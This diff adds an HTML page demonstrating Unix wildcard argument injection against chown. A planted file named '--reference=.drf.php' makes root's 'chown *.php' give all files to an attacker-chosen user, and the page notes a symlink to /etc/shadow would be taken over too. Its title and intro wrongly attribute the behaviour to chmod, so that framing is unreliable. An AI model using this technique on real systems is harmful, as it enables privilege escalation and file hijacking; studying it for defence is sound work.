@@ -1,0 +1,88 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Chmod</title>
+</head><body>Chmod has a --reference= function <br/>
+<br/>
+--reference=RFILE &#09;use RFILE's owner and group rather than specifying OWNER:GROUP values<br/>
+<br/>
+Here's an example and a way to even change ownership of files through linking!<br/>
+<br/>
+root@defensecode public]# ls -al<br/>
+total 52<br/>
+drwxrwxrwx. &nbsp;2 user user 4096 Oct 28 17:47 .<br/>
+drwx------. 22 user user 4096 Oct 28 17:34 ..<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 66 Oct 28 17:36 admin.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 34 Oct 28 17:35 ado.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 80 Oct 28 17:44 config.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp;187 Oct 28 17:44 db.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp;201 Oct 28 17:35 download.php<br/>
+-rw-r--r--. &nbsp;1 leon leon &nbsp; &nbsp;0 Oct 28 17:40 .drf.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 43 Oct 28 17:35 file1.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 56 Oct 28 17:47 footer.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp;357 Oct 28 17:36 global.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp;225 Oct 28 17:35 header.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp;117 Oct 28 17:35 inc.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp;111 Oct 28 17:38 index.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; &nbsp;0 Oct 28 17:45 --reference=.drf.php<br/>
+-rw-rw----. &nbsp;1 user user &nbsp; 66 Oct 28 17:35 password.inc.php<br/>
+-rw-rw-r--. &nbsp;1 user user &nbsp; 94 Oct 28 17:35 script.php<br/>
+<br/>
+Files in this public directory are mostly owned by the user named 'user', <br/>
+and root user will now change that to 'nobody'.<br/>
+<br/>
+[root@defensecode public]# chown -R nobody:nobody *.php<br/>
+<br/>
+Let's see who owns files now...<br/>
+<br/>
+[root@defensecode public]# ls -al<br/>
+total 52<br/>
+drwxrwxrwx. &nbsp;2 user user 4096 Oct 28 17:47 .<br/>
+drwx------. 22 user user 4096 Oct 28 17:34 ..<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; 66 Oct 28 17:36 admin.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; 34 Oct 28 17:35 ado.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; 80 Oct 28 17:44 config.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp;187 Oct 28 17:44 db.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp;201 Oct 28 17:35 download.php<br/>
+-rw-r--r--. &nbsp;1 leon leon &nbsp; &nbsp;0 Oct 28 17:40 .drf.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; 43 Oct 28 17:35 file1.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; 56 Oct 28 17:47 footer.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp;357 Oct 28 17:36 global.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp;225 Oct 28 17:35 header.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp;117 Oct 28 17:35 inc.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp;111 Oct 28 17:38 index.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; &nbsp;0 Oct 28 17:45 --reference=.drf.php<br/>
+-rw-rw----. &nbsp;1 leon leon &nbsp; 66 Oct 28 17:35 password.inc.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; 94 Oct 28 17:35 script.php<br/>
+<br/>
+Something is not right... What happened? Somebody got drunk here.<br/>
+Superuser tried to change files owner to the user:group 'nobody', but somehow, <br/>
+all files are owned by the user 'leon' now.<br/>
+<br/>
+If we take closer look, this directory previously contained just the <br/>
+following two files created and owned by the user 'leon'.<br/>
+<br/>
+-rw-r--r--. &nbsp;1 leon leon &nbsp; &nbsp;0 Oct 28 17:40 .drf.php<br/>
+-rw-rw-r--. &nbsp;1 leon leon &nbsp; &nbsp;0 Oct 28 17:45 --reference=.drf.php<br/>
+<br/>
+Thing is that wildcard character used in 'chown' command line took arbitrary <br/>
+'--reference=.drf.php' file and passed it to the chown command at<br/>
+the command line as an option.<br/>
+<br/>
+So in this case, '--reference' option to 'chown' will override 'nobody:nobody'<br/>
+specified as the root, and new owner of files in this directory will be exactly<br/>
+same as the owner of '.drf.php', which is in this case user 'leon'.<br/>
+Just for the record, '.drf' is short for Dummy Reference File. :)<br/>
+<br/>
+To conclude, reference option can be abused to change ownership of files to some <br/>
+arbitrary user. If we set some other file as argument to the --reference option,<br/>
+file that's owned by some other user, not 'leon', in that case he would become owner <br/>
+of all files in this directory.<br/>
+<br/>
+With this simple chown parameter pollution, we can trick root into changing ownership <br/>
+of files to arbitrary users, and practically "hijack" files that are of interest to us.<br/>
+<br/>
+Even more, if user 'leon' previously created a symbolic link in that directory <br/>
+that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed <br/>
+to the user 'leon'.</body></html>
